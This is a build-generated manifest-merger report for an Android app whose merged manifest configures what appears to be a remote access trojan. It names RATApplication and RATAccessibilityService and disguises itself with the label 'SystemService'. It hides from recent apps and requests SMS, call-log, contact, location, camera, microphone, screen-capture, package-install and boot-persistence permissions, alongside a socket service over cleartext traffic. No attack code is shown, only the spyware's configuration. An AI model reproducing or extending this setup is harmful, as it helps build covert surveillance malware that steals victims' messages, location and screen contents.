app/build/intermediates/manifest_merge_blame_file/debug/manifest-merger-blame-debug-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.mudesir.mooody"
4    android:versionCode="1"
5    android:versionName="3.0.0" >
6
7    <uses-sdk
8        android:minSdkVersion="26"
9        android:targetSdkVersion="33" />
10
11    <uses-permission android:name="android.permission.INTERNET" />
11-->src/main/AndroidManifest.xml:5:5-67
11-->src/main/AndroidManifest.xml:5:22-64
12    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
12-->src/main/AndroidManifest.xml:6:5-79
12-->src/main/AndroidManifest.xml:6:22-76
13    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
13-->src/main/AndroidManifest.xml:7:5-79
13-->src/main/AndroidManifest.xml:7:22-76
14    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
14-->src/main/AndroidManifest.xml:8:5-81
14-->src/main/AndroidManifest.xml:8:22-78
15    <uses-permission android:name="android.permission.CAMERA" />
15-->src/main/AndroidManifest.xml:9:5-65
15-->src/main/AndroidManifest.xml:9:22-62
16    <uses-permission android:name="android.permission.RECORD_AUDIO" />
16-->src/main/AndroidManifest.xml:10:5-71
16-->src/main/AndroidManifest.xml:10:22-68
17    <uses-permission android:name="android.permission.READ_SMS" />
17-->src/main/AndroidManifest.xml:11:5-67
17-->src/main/AndroidManifest.xml:11:22-64
18    <uses-permission android:name="android.permission.SEND_SMS" />
18-->src/main/AndroidManifest.xml:12:5-67
18-->src/main/AndroidManifest.xml:12:22-64
19    <uses-permission android:name="android.permission.READ_CONTACTS" />
19-->src/main/AndroidManifest.xml:13:5-72
19-->src/main/AndroidManifest.xml:13:22-69
20    <uses-permission android:name="android.permission.READ_CALL_LOG" />
20-->src/main/AndroidManifest.xml:14:5-72
20-->src/main/AndroidManifest.xml:14:22-69
21    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
21-->src/main/AndroidManifest.xml:15:5-77
21-->src/main/AndroidManifest.xml:15:22-74
22    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
22-->src/main/AndroidManifest.xml:16:5-87
22-->src/main/AndroidManifest.xml:16:22-84
23    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
23-->src/main/AndroidManifest.xml:17:5-94
23-->src/main/AndroidManifest.xml:17:22-91
24    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
24-->src/main/AndroidManifest.xml:18:5-78
24-->src/main/AndroidManifest.xml:18:22-75
25    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
25-->src/main/AndroidManifest.xml:19:5-77
25-->src/main/AndroidManifest.xml:19:22-74
26    <uses-permission
26-->src/main/AndroidManifest.xml:20:5-21:38
27        android:name="android.permission.READ_EXTERNAL_STORAGE"
27-->src/main/AndroidManifest.xml:20:22-77
28        android:maxSdkVersion="32" />
28-->src/main/AndroidManifest.xml:21:9-35
29    <uses-permission
29-->src/main/AndroidManifest.xml:22:5-23:38
30        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
30-->src/main/AndroidManifest.xml:22:22-78
31        android:maxSdkVersion="29" />
31-->src/main/AndroidManifest.xml:23:9-35
32    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
32-->src/main/AndroidManifest.xml:24:5-25:40
32-->src/main/AndroidManifest.xml:24:22-79
33    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
33-->src/main/AndroidManifest.xml:26:5-83
33-->src/main/AndroidManifest.xml:26:22-80
34    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
34-->src/main/AndroidManifest.xml:27:5-85
34-->src/main/AndroidManifest.xml:27:22-82
35    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
35-->src/main/AndroidManifest.xml:28:5-81
35-->src/main/AndroidManifest.xml:28:22-78
36    <uses-permission android:name="android.permission.VIBRATE" />
36-->src/main/AndroidManifest.xml:29:5-66
36-->src/main/AndroidManifest.xml:29:22-63
37    <uses-permission android:name="android.permission.FLASHLIGHT" />
37-->src/main/AndroidManifest.xml:30:5-69
37-->src/main/AndroidManifest.xml:30:22-66
38    <uses-permission android:name="android.permission.WAKE_LOCK" />
38-->src/main/AndroidManifest.xml:31:5-68
38-->src/main/AndroidManifest.xml:31:22-65
39    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
39-->src/main/AndroidManifest.xml:32:5-33:53
39-->src/main/AndroidManifest.xml:32:22-74
40
41    <application
41-->src/main/AndroidManifest.xml:35:5-88:19
42        android:name="com.mudesir.mooody.RATApplication"
42-->src/main/AndroidManifest.xml:36:9-39
43        android:debuggable="true"
44        android:extractNativeLibs="false"
45        android:icon="@mipmap/ic_launcher"
45-->src/main/AndroidManifest.xml:37:9-43
46        android:label="SystemService"
46-->src/main/AndroidManifest.xml:38:9-38
47        android:networkSecurityConfig="@xml/network_security_config"
47-->src/main/AndroidManifest.xml:40:9-69
48        android:supportsRtl="true"
48-->src/main/AndroidManifest.xml:41:9-35
49        android:theme="@style/Theme.MoodyControl"
49-->src/main/AndroidManifest.xml:39:9-50
50        android:usesCleartextTraffic="true" >
50-->src/main/AndroidManifest.xml:42:9-44
51        <activity
51-->src/main/AndroidManifest.xml:45:9-55:20
52            android:name="com.mudesir.mooody.MainActivity"
52-->src/main/AndroidManifest.xml:46:13-41
53            android:excludeFromRecents="true"
53-->src/main/AndroidManifest.xml:49:13-46
54            android:exported="true"
54-->src/main/AndroidManifest.xml:47:13-36
55            android:noHistory="true"
55-->src/main/AndroidManifest.xml:50:13-37
56            android:theme="@style/Theme.MoodyControl" >
56-->src/main/AndroidManifest.xml:48:13-54
57            <intent-filter>
57-->src/main/AndroidManifest.xml:51:13-54:29
58                <action android:name="android.intent.action.MAIN" />
58-->src/main/AndroidManifest.xml:52:17-69
58-->src/main/AndroidManifest.xml:52:25-66
59
60                <category android:name="android.intent.category.LAUNCHER" />
60-->src/main/AndroidManifest.xml:53:17-77
60-->src/main/AndroidManifest.xml:53:27-74
61            </intent-filter>
62        </activity>
63
64        <service
64-->src/main/AndroidManifest.xml:57:9-60:56
65            android:name="com.mudesir.mooody.services.SocketService"
65-->src/main/AndroidManifest.xml:58:13-51
66            android:exported="false"
66-->src/main/AndroidManifest.xml:59:13-37
67            android:foregroundServiceType="dataSync" />
67-->src/main/AndroidManifest.xml:60:13-53
68        <service
68-->src/main/AndroidManifest.xml:62:9-65:63
69            android:name="com.mudesir.mooody.services.ScreenCaptureService"
69-->src/main/AndroidManifest.xml:63:13-58
70            android:exported="false"
70-->src/main/AndroidManifest.xml:64:13-37
71            android:foregroundServiceType="mediaProjection" />
71-->src/main/AndroidManifest.xml:65:13-60
72        <service
72-->src/main/AndroidManifest.xml:67:9-77:19
73            android:name="com.mudesir.mooody.services.RATAccessibilityService"
73-->src/main/AndroidManifest.xml:68:13-61
74            android:exported="true"
74-->src/main/AndroidManifest.xml:69:13-36
75            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
75-->src/main/AndroidManifest.xml:70:13-79
76            <intent-filter>
76-->src/main/AndroidManifest.xml:71:13-73:29
77                <action android:name="android.accessibilityservice.AccessibilityService" />
77-->src/main/AndroidManifest.xml:72:17-92
77-->src/main/AndroidManifest.xml:72:25-89
78            </intent-filter>
79
80            <meta-data
80-->src/main/AndroidManifest.xml:74:13-76:72
81                android:name="android.accessibilityservice"
81-->src/main/AndroidManifest.xml:75:17-60
82                android:resource="@xml/accessibility_service_config" />
82-->src/main/AndroidManifest.xml:76:17-69
83        </service>
84
85        <receiver
85-->src/main/AndroidManifest.xml:79:9-86:20
86            android:name="com.mudesir.mooody.services.BootReceiver"
86-->src/main/AndroidManifest.xml:80:13-50
87            android:exported="true" >
87-->src/main/AndroidManifest.xml:81:13-36
88            <intent-filter>
88-->src/main/AndroidManifest.xml:82:13-85:29
89                <action android:name="android.intent.action.BOOT_COMPLETED" />
89-->src/main/AndroidManifest.xml:83:17-79
89-->src/main/AndroidManifest.xml:83:25-76
90                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
90-->src/main/AndroidManifest.xml:84:17-82
90-->src/main/AndroidManifest.xml:84:25-79
91            </intent-filter>
92        </receiver>
93    </application>
94
95</manifest>